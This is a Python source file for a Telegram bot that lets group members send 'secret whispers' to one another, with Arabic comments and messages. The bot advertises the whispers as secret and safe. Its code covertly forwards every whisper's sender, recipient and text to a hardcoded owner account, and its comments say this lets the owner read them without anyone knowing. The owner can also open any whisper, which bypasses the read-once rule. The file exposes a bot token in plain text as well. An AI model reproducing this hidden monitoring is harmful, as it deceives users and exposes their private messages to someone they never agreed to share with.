import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8912650382:AAGxGtTJ6loePuTG3Dyt3f8Knhpa4HGDR4A"
bot = telebot.TeleBot(TOKEN)

# 🚨 ضع آي دي حسابك الشخصي هنا (المالك) لقراءة كل الهمسات سراً
OWNER_ID = 6312345678  # <--- استبدل الرقم برقم حسابك الحقيقي

# تخزين مؤقت
active_whispers = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    args = message.text.split()
    if len(args) > 1:
        param = args[1]
        
        # حالة الضغط على زر "اهمس هنا" في المجموعة
        if param.startswith("target_"):
            try:
                parts = param.replace("target_", "").split("_")
                target_id = int(parts[0])
                target_name = parts[1]
                
                # حفظ حالة أن هذا المستخدم يكتب همسة لهذا الشخص الآن
                active_whispers[f"writing_{message.from_user.id}"] = {
                    'target_id': target_id,
                    'target_name': target_name,
                    'chat_id': message.chat.id
                }
                
                bot.reply_to(message, f"• 💌 اكتب همستك لـ **{target_name}** الآن:", parse_mode="Markdown")
            except Exception:
                bot.reply_to(message, "❌ حدث خطأ، حاول مرة أخرى.")
            return
            
        # حالة قراءة الهمسة
        elif param.startswith("whisper_"):
            whisper_id = param.replace("whisper_", "")
            if whisper_id in active_whispers:
                w = active_whispers[whisper_id]
                
                if message.from_user.id != w['target_id'] and message.from_user.id != OWNER_ID:
                    bot.reply_to(message, "❌ عذراً، هذه الهمسة ليست موجهة لك!")
                    return
                    
                if w['read_status'] and message.from_user.id != OWNER_ID:
                    bot.reply_to(message, "⚠️ عذراً، هذه الهمسة تمت قراءتها مسبقاً.")
                else:
                    w['read_status'] = True
                    bot.reply_to(
                        message,
                        f"• تمت قراءة الهمسة .. بنجاح\n• بواسطة العضو المطلوب ✨\n- من قبل ← {w['sender_name']}♡\n\n💌 النص:\n{w['text']}"
                    )
                return

    # الترحيب العادي في الخاص
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("➕ اضفني لمجموعتك", url=f"https://t.me/{bot.get_me().username}?startgroup=true"))
    bot.reply_to(
        message,
        "✨ **أهلاً بك في بوت الهمسات الذكي**\n\n"
        "🛡️ • يمكنك من خلالي إرسال همسات سرية وآمنة داخل المجموعات لأي عضو بالرد على رسالته.\n\n"
        "💡 • **طريقة الاستخدام:**\n"
        "• رد على رسالة أي شخص في المجموعة بكلمة (همس) أو حرف (هـ)\n"
        "• اضغط على زر (اهمس هنا) المظهر واكتب همستك بكل سرية!",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: message.chat.type == 'private')
def private_chat(message):
    user_id = message.from_user.id
    writing_key = f"writing_{user_id}"
    
    if writing_key in active_whispers:
        target_info = active_whispers[writing_key]
        whisper_text = message.text.strip()
        
        whisper_id = f"{user_id}_{target_info['target_id']}_{message.message_id}"
        active_whispers[whisper_id] = {
            'text': whisper_text,
            'sender_name': message.from_user.first_name,
            'target_id': target_info['target_id'],
            'read_status': False
        }
        
        markup = InlineKeyboardMarkup()
        bot_username = bot.get_me().username
        markup.add(InlineKeyboardButton("👁️ اضغط هنا لقراءة الهمسة", url=f"https://t.me/{bot_username}?start=whisper_{whisper_id}"))
        
        target_mention = f"[{target_info['target_name']}](tg://user?id={target_info['target_id']})"
        
        bot.send_message(
            target_info['chat_id'],
            f"• تم تحديد الهمسه لـ ⟵ {target_mention}\n• من ⟵ {message.from_user.first_name}\n-",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        
        bot.reply_to(message, f"• تم ارسال همستك لـ {target_info['target_name']} بنجاح")
        
        # 🕵️‍♂️ نسخة سريعة للمالك (أنت) لتستطيع قراءة الهمسات دون أن يدري أحد
        try:
            bot.send_message(
                OWNER_ID,
                f"🚨 [مراقبة المالك]\n👤 من: {message.from_user.first_name}\n🎯 إلى: {target_info['target_name']}\n💌 النص:\n{whisper_text}"
            )
        except Exception:
            pass
            
        del active_whispers[writing_key]
    else:
        bot.reply_to(message, "الرجاء الرد بكلمة (هـ) على الشخص في المجموعة أولاً.")

@bot.message_handler(func=lambda message: message.chat.type != 'private')
def group_chat(message):
    if not message.reply_to_message or message.text.strip() not in ["هـ", "ه", "همس", "اهمس"]:
        return
        
    target = message.reply_to_message.from_user
    if target.is_bot or message.from_user.id == target.id:
        return
        
    markup = InlineKeyboardMarkup()
    bot_username = bot.get_me().username
    # زر اهمس هنا يوجه المستخدم للخاص مباشرة مع تمرير الآي دي والاسم تماماً مثل بوت الماس
    markup.add(InlineKeyboardButton("🛡️ اهمس هنا", url=f"https://t.me/{bot_username}?start=target_{target.id}_{target.first_name}"))
    
    target_mention = f"[{target.first_name}](tg://user?id={target.id})"
    
    bot.reply_to(
        message,
        f"• تم تحديد الهمسه لـ ⟵ {target_mention}\n• اضغط الزر لكتابة الهمسة في الخاص\n-",
        reply_markup=markup,
        parse_mode="Markdown"
    )

bot.infinity_polling()
